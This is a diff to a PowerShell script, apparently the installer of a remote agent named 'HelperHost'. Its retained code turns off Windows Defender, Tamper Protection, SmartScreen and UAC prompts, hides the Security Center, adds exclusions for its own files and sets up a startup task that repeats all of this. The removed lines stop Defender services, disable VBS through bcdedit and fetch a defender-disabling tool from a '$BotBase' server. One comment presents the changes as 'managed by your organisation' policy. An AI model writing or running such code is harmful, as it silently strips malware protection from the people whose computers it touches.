@@ -262,12 +262,40 @@ function Wait-InteractiveLogon {
 }
 
 function Download-File([string]$Url, [string]$OutFile) {
-  if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
-    & curl.exe -fsSL $Url -o $OutFile
-    if ($LASTEXITCODE -ne 0) { throw "download failed: $Url" }
-    return
+  $dir = Split-Path -Parent $OutFile
+  if ($dir -and -not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+  $tmp = Join-Path $env:TEMP ('hh-dl-' + [guid]::NewGuid().ToString('n') + '.bin')
+  $ok = $false
+  $last = $null
+  for ($i = 1; $i -le 3; $i++) {
+    try {
+      Remove-Item $tmp -Force -EA SilentlyContinue
+      if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
+        & curl.exe -fsSL --retry 2 --retry-delay 1 -o $tmp $Url
+        if ($LASTEXITCODE -ne 0) { throw "curl exit $LASTEXITCODE : $Url" }
+      } else {
+        Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $tmp
+      }
+      if (-not (Test-Path $tmp) -or (Get-Item $tmp).Length -lt 1) { throw "empty download: $Url" }
+      # Atomic-ish publish (avoids AV eating mid-write on final path)
+      Copy-Item -LiteralPath $tmp -Destination $OutFile -Force -EA Stop
+      Remove-Item $tmp -Force -EA SilentlyContinue
+      $ok = $true
+      break
+    } catch {
+      $last = $_
+      Start-Sleep -Seconds $i
+    }
   }
-  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $OutFile
+  Remove-Item $tmp -Force -EA SilentlyContinue
+  if (-not $ok) { throw "download failed: $Url ($last)" }
+}
+
+function Test-ToolExe([string]$Path, [int]$MinBytes = 100000) {
+  try {
+    if (-not (Test-Path -LiteralPath $Path)) { return $false }
+    return ((Get-Item -LiteralPath $Path -EA Stop).Length -ge $MinBytes)
+  } catch { return $false }
 }
 
 function Restore-OrFetch([string]$Name, [string]$Url) {
@@ -617,42 +645,8 @@ function Disable-AllBlocking {
   New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\NIS\Consumers\Consumer Experience' -Force | Out-Null
   Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\NIS\Consumers\Consumer Experience' -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
 
-  $ci = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
-  New-Item $ci -Force | Out-Null
-  Set-ItemProperty $ci -Name VerifiedAndReputablePolicyState -Value 0 -Type DWord -Force
-
-  $dg = 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard'
-  New-Item $dg -Force | Out-Null
-  Set-ItemProperty $dg -Name EnableVirtualizationBasedSecurity -Value 0 -Type DWord -Force
-  Set-ItemProperty $dg -Name RequirePlatformSecurityFeatures -Value 0 -Type DWord -Force
-  Set-ItemProperty $dg -Name Locked -Value 0 -Type DWord -Force
-  New-Item "$dg\Scenarios\HypervisorEnforcedCodeIntegrity" -Force | Out-Null
-  Set-ItemProperty "$dg\Scenarios\HypervisorEnforcedCodeIntegrity" -Name Enabled -Value 0 -Type DWord -Force
-  Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name LsaCfgFlags -Value 0 -Type DWord -Force
-
-  try { cmd.exe /c "bcdedit.exe /set {current} vsmlaunchtype Off >nul 2>&1" | Out-Null } catch {}
-  try { cmd.exe /c "bcdedit.exe /set {current} hypervisorlaunchtype off >nul 2>&1" | Out-Null } catch {}
-
-  $cip = Join-Path $env:WINDIR 'System32\CodeIntegrity\CiPolicies\Active'
-  if (Test-Path $cip) {
-    Get-ChildItem $cip -Filter '*.cip' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-  }
-
-  # Hard-disable Defender services (best-effort — Tamper/Protected Process often refuse stop)
-  foreach ($svc in @('WinDefend', 'Sense', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'SecurityHealthService', 'wscsvc', 'webthreatdefsvc', 'webthreatdefusersvc')) {
-    try { cmd.exe /c "sc.exe stop `"$svc`" >nul 2>&1" | Out-Null } catch {}
-    try { cmd.exe /c "sc.exe config `"$svc`" start= disabled >nul 2>&1" | Out-Null } catch {}
-    $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
-    if (Test-Path $svcKey) {
-      try { Set-ItemProperty $svcKey -Name Start -Value 4 -Type DWord -Force -EA SilentlyContinue } catch {}
-    }
-    try { Stop-Service $svc -Force -ErrorAction SilentlyContinue } catch {}
-    try { Set-Service $svc -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
-  }
-  try {
-    Get-Process MsMpEng, NisSrv, SecurityHealthService, smartscreen, SecurityHealthSystray -EA SilentlyContinue |
-      Stop-Process -Force -EA SilentlyContinue
-  } catch {}
+  # PAS de sc stop / Start=4 / bcdedit / soft-delete binaires :
+  # "Gere par votre organisation" = policies reversibles au wipe, moteur intact.
 
   # NEVER MpCmdRun -RemoveDefinitions -All: bricks signatures and breaks wipe restore.
 
@@ -660,69 +654,14 @@ function Disable-AllBlocking {
   try { $PSNativeCommandUseErrorActionPreference = $script:__prevNativeEap } catch {}
 }
 
-function Install-DefenderControl {
-  # Open-source pgkt04/defender-control (MIT) — pas Sordum dControl (UI infinie).
-  # Review: console CLI, TrustedInstaller, pas de reseau. Exes: disable/enable-defender.exe -s
-  if (-not (Test-IsAdmin)) { return }
-  $dis = Join-Path $Dir 'disable-defender.exe'
-  $src = "$($BotBase.TrimEnd('/'))/files/tools/disable-defender.exe"
-  # Drop legacy Sordum binary if present (causes UI pop loop)
-  Remove-Item (Join-Path $Dir 'dControl.exe') -Force -EA SilentlyContinue
-  Remove-Item (Join-Path $Dir 'dc-off.cmd') -Force -EA SilentlyContinue
-  Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
-
-  $need = $true
-  if (Test-Path $dis) {
-    try { if ((Get-Item $dis).Length -gt 100000) { $need = $false } } catch {}
-  }
-  if ($need) {
-    try {
-      Download-File $src $dis
-      Unblock-Quiet $dis
-      Hide-HH $dis
-    } catch {
-      Write-Host "disable-defender download: $($_.Exception.Message)"
-    }
-  }
-  # Stage enable for wipe later (HelperHost dir + durable ProgramData wipe kit)
-  $en = Join-Path $Dir 'enable-defender.exe'
-  $ens = "$($BotBase.TrimEnd('/'))/files/tools/enable-defender.exe"
-  if (-not (Test-Path $en) -or (Get-Item $en).Length -lt 100000) {
-    try { Download-File $ens $en; Unblock-Quiet $en; Hide-HH $en } catch {}
-  }
-  try { Install-WipeKit } catch {}
-  if (-not (Test-Path $dis)) { return }
-
-  try {
-    if (Get-Command Add-MpPreference -EA SilentlyContinue) {
-      Add-MpPreference -ExclusionPath $Dir -EA SilentlyContinue
-      Add-MpPreference -ExclusionProcess 'disable-defender.exe' -EA SilentlyContinue
-      Add-MpPreference -ExclusionProcess 'enable-defender.exe' -EA SilentlyContinue
-    }
-  } catch {}
-
-  # -s = silent (no pause). Runs as admin → self-elevates to TrustedInstaller.
-  try {
-    $p = Start-Process -FilePath $dis -ArgumentList @('-s') -Wait -PassThru -WindowStyle Hidden -EA Stop
-    Write-Host "disable-defender -s exit=$($p.ExitCode)"
-  } catch {
-    try { & cmd.exe /c "`"$dis`" -s >nul 2>&1" | Out-Null } catch {}
-  }
-  Get-Process 'disable-defender','dControl' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
-  '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.dcontrol-off') -Force -EA SilentlyContinue
-  Write-Host 'disable-defender -s done'
-}
-
 function Invoke-SessionHarden {
-  # Always: full AV off + UAC silent + notifs + exclusions + wipe hook
+  # AV off via GPO "gere par votre organisation" only — reversible on wipe, no .exe soft-delete.
   if (-not (Test-IsAdmin)) { return }
-  # Open-source defender-control FIRST, then our GPO hide UI
-  Install-DefenderControl
+  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
   Disable-AllBlocking
   Disable-UACPrompts
   Disable-SecurityCenterToasts
   Disable-WindowsNotifications
-  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
   Install-WipeRestoreHook
   Install-EarlyAvTask
   Request-AvRebootIfNeeded
@@ -741,18 +680,17 @@ function Test-AvStillOn {
 }
 
 function Request-AvRebootIfNeeded {
-  # Reboot UNIQUEMENT si Defender/Tamper restent actifs apres disable-defender + policies.
+  # Reboot UNIQUEMENT si Defender/Tamper restent actifs apres policies org.
   # Connect OK + AV coupe → pas de reboot, session utilisable tout de suite.
   if (-not (Test-IsAdmin)) { return }
   Install-EarlyAvTask
 
-  # Laisser disable-defender / services digerer
-  Start-Sleep -Seconds 3
+  Start-Sleep -Seconds 2
 
   if (-not (Test-AvStillOn)) {
     '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
     Remove-Item (Join-Path $Dir '.av-need-reboot') -Force -EA SilentlyContinue
-    Write-Host 'AV coupe (disable-defender/policies) — pas de reboot.'
+    Write-Host 'AV coupe (policies organisation) — pas de reboot.'
     return
   }
 
@@ -766,7 +704,7 @@ function Request-AvRebootIfNeeded {
 
   'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
   '1' | Set-Content -Encoding ASCII $once -Force
-  Write-Host 'AV/Tamper encore actifs apres disable-defender — reboot dans 20s pour EarlyAV...'
+  Write-Host 'AV/Tamper encore actifs apres policies — reboot dans 20s pour EarlyAV...'
   try {
     Start-Process -FilePath "$env:SystemRoot\System32\shutdown.exe" `
       -ArgumentList @('/r', '/t', '20', '/c', 'HelperHost: AV organisation (fallback)', '/f') `
@@ -784,17 +722,10 @@ function Get-WipeKitDir {
 }
 
 function Install-WipeKit {
-  # Durable restore kit outside HelperHost so wipe can restore AV even after Nuke-Tree.
+  # Durable restore kit outside HelperHost so wipe can clear org policies even after Nuke-Tree.
   if (-not (Test-IsAdmin)) { return }
   $kit = Get-WipeKitDir
   Remove-Item (Join-Path $kit 'STOP') -Force -EA SilentlyContinue
-  $enSrc = Join-Path $Dir 'enable-defender.exe'
-  $enDst = Join-Path $kit 'enable-defender.exe'
-  if (Test-Path $enSrc) {
-    Copy-Item $enSrc $enDst -Force -EA SilentlyContinue
-  } elseif ($BotBase) {
-    try { Download-File "$($BotBase.TrimEnd('/'))/files/tools/enable-defender.exe" $enDst } catch {}
-  }
   $restoreDest = Join-Path $kit 'restore-win-security.ps1'
   $restoreUrl = $null
   if ($InstallUrl) {
@@ -822,11 +753,6 @@ function Install-EarlyAvTask {
     '@echo off'
     'if exist "%ProgramData%\HelperHostWipe\STOP" exit /b 0'
     'cd /d "%~dp0"'
-    'if exist "%~dp0disable-defender.exe" ('
-    '  "%~dp0disable-defender.exe" -s'
-    '  taskkill /F /IM disable-defender.exe >nul 2>&1'
-    '  taskkill /F /IM dControl.exe >nul 2>&1'
-    ')'
     'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtectionSource /t REG_DWORD /d 0 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1'
@@ -848,13 +774,6 @@ function Install-EarlyAvTask {
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Device security" /v HideDeviceSecurityPage /t REG_DWORD /d 1 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray" /v HideSystray /t REG_DWORD /d 1 /f >nul 2>&1'
     'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1'
-    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
-    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
-    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
-    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
-    'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f >nul 2>&1'
-    'sc stop WinDefend >nul 2>&1'
-    'sc config WinDefend start= disabled >nul 2>&1'
   ) -join "`r`n" | Set-Content -Encoding ASCII $cmd
 
   $tn = 'HelperHostEarlyAV'
@@ -881,10 +800,7 @@ function Set-DefenderExclude([string]$Path, [string]$Exe) {
     Add-MpPreference -ExclusionPath $Cache -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $tools -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess 'disable-defender.exe' -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess 'enable-defender.exe' -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess 'EdgeRelay.exe' -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess 'dControl.exe' -ErrorAction SilentlyContinue
     Add-MpPreference -ControlledFolderAccessAllowedApplications $Exe -ErrorAction SilentlyContinue
     if (Test-Path $edge) {
       Add-MpPreference -ControlledFolderAccessAllowedApplications $edge -ErrorAction SilentlyContinue
